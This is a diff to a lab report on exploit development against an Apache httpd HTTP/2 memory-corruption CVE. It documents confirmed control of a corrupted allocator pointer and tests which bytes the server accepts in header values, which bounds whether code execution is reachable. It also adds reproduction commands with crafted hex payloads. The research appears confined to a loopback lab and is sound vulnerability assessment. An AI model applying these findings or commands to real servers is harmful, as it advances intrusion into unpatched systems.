@@ -1,11 +1,13 @@
 # Apache2Root investigation — CVE-2026-119618 / GHSA-34m4-m9fh-gqp5
 
-Voice: `apache2shell`. Status 2026-11-20 17:09Z: **rung 3 confirmed**
+Voice: `apache2shell`. Status 2026-11-20 17:36Z: **rung 3 confirmed**
 (reproducible differential crash + corrupted pool metadata under gdb) and
 **Stage A of rung 4 observed** (chosen header bytes at a chosen offset in the
 corrupted pointer, including all 8 bytes of the faulting allocator pointer).
-Stages B/C NOT reached: no wire-pure trigger, no canonical pointer, no benign
-marker execution. Everything below was from this plant's loopback lab.
+Stage C remains UNKNOWN: this build rejects NUL in h2 field values, so the
+`00` high bytes of a canonical x86-64 user pointer cannot be sent on the wire;
+binary DATA bytes did not land in the fault word. Everything below was from
+this plant's loopback lab.
 
 ## Rung 1 — suspected (source-bound, verified locally)
 
@@ -202,18 +204,45 @@ copies of the chosen value in the header-string area and 296 copies of the
 faulting word from the p7198 capture is absent, so the dump locates the source
 pool but does not by itself prove the write.
 
+### Stage C alphabet boundary (17:33–17:36Z)
+
+The 17:09Z note called NUL in field values a blocker without testing it. Tested now.
+
+- `FILL_VALUE_HEX` in `drive.py` puts raw bytes on the wire (the HPACK literals
+  in `h2client.py` already accept `bytes`). With
+  `FILL_VALUE_HEX=41414141424242420041424344454647` (NUL at value[8]) on 2.4.70
+  p7211: `sent=800 responses=816`, one access-log line (the curl readiness
+  GET), no crash. The ASCII hex control
+  `FILL_VALUE_HEX=41414141424242424343434344444444` on p7212 sent 3500
+  requests and faulted at `apr_allocator_free+23` — the hex option itself is
+  not the cause.
+- `alphabet-probe.py 7216` starts a private 2.4.70 and sends one h2c request
+  per candidate byte. Observed: `0x00`, `0x0a`, `0x0d`, `0x1f`, `0x7f` →
+  `RST:1` (PROTOCOL_ERROR), no server request; `0x09`, `0x20`, `0x7e`, `0x80`,
+  `0xff` → HTTP 200. Obs-text bytes are accepted; NUL is not.
+- `BODY_CANARY_HEX` sends binary DATA on alternate streams of the same c1
+  connection. p7214 (2.4.70, 16-byte ASCII value canary plus body canary
+  `00 00 7f ff BODYCAN ...`): 2600 sent, fault in `apr_palloc+41`
+  (`mov 0x20(%rbx),%rax` from `h2_request.c:51`) with the pool's allocator
+  slot zero. The body canary is absent from the fault word and from both the
+  256 KiB heap dump and the 32 KiB stack dump. Fixed control p7215 with
+  identical traffic: 15300 sent, zero faults.
+
+Within field values the accepted alphabet cannot spell the two leading zero
+bytes required by a canonical x86-64 user pointer (`00 00 7f ...`); `0x7f` is
+also rejected. `0x80`–`0xff` are accepted, but mixed high bytes are
+non-canonical. Disabling ASLR would not supply the missing `00` bytes. No
+canonical pointer or benign marker execution was produced; Stage C stays
+UNKNOWN, now bounded by an observed wire alphabet rather than an assumption.
+
 ### Why Stages B/C are not claimed
 
-Full 8-byte control of the faulting allocator-pointer slot is now observed
-(p7210), so offset control is not the remaining blocker. The controlled bytes
-are ASCII from HTTP header fields: a canonical x86-64 user pointer needs high
-bytes `00 00`, which cannot be spelled in an HTTP/2 field value without the
-NUL/CR/LF bytes httpd rejects — `rdi = "CCCCDDDD"` is a wild non-pointer.
-No capture produced a canonical pointer or a benign marker execution. No
-debugger-forced ledger state was used, so a wire-pure Stage B claim is also
-not made. Stage C stays UNKNOWN: the open question is an allocation layout
-whose useful target word is spelled entirely from token-legal bytes, not how
-to place more bytes.
+Full 8-byte control of the faulting allocator-pointer slot is observed
+(p7210), so offset control is not the remaining blocker; the observed wire
+alphabet (above) is. No capture produced a canonical pointer or a benign
+marker execution, and no debugger-forced ledger state was used. Stage C stays
+UNKNOWN: the open question is an allocation layout whose useful target word is
+spelled entirely from accepted bytes, not how to place more bytes.
 
 ## Reproduction (from a clean checkout, loopback only)
 
@@ -224,9 +253,15 @@ cd lab/apache2shell
 ./gdb-inspect.sh 2.4.70 <port> 78 20               # gdb fault + memory dump
 FILL_VALUE=Q7wX9kLm ./gdb-inspect.sh 2.4.70 <port> 78 30  # canary placement
 FILL_VALUE=Q7wX9kLm ./gdb-inspect.sh 2.4.71 <port> 78 30  # control: no fault
+FILL_VALUE_HEX=41414141424242420041424344454647 \
+  ./gdb-inspect.sh 2.4.70 <port> 78 25          # NUL: no server requests
+python3 alphabet-probe.py <port>                # accepted-byte map, private instance
+BODY_CANARY_HEX=00007fff424f445943414e00000000 \
+  ./gdb-inspect.sh 2.4.70 <port> 78 30          # binary DATA: no NUL in fault word
 ```
 
 `oracle.sh` in `lab/frontier/apache2root/` reproduces rung 2. Runtime state
 (`logs/`, `run/`) is gitignored; only scripts and this report are committed.
 
-`drive.py`, `sweep.sh`, `gdb-inspect.sh` are this plant's harnesses. `h2client.py` and `ref-poc.py` were fetched 2026-11-20 from `github.com/googlesky/CVE-2026-119618` (`poc/h2.py`, `poc/poc.py`) as unmodified reference inputs; claims about that repository remain claims. `race-boundary.sh` (partial, cut mid-sweep) and `sweep-asanforce.sh` (invalid, resource-shortage run) are preserved negatives, not canonical drivers.
+`drive.py`, `sweep.sh`, `gdb-inspect.sh` and `alphabet-probe.py` are this
+plant's harnesses. `h2client.py` and `ref-poc.py` were fetched 2026-11-20 from `github.com/googlesky/CVE-2026-119618` (`poc/h2.py`, `poc/poc.py`) as unmodified reference inputs; claims about that repository remain claims. `race-boundary.sh` (partial, cut mid-sweep) and `sweep-asanforce.sh` (invalid, resource-shortage run) are preserved negatives, not canonical drivers.
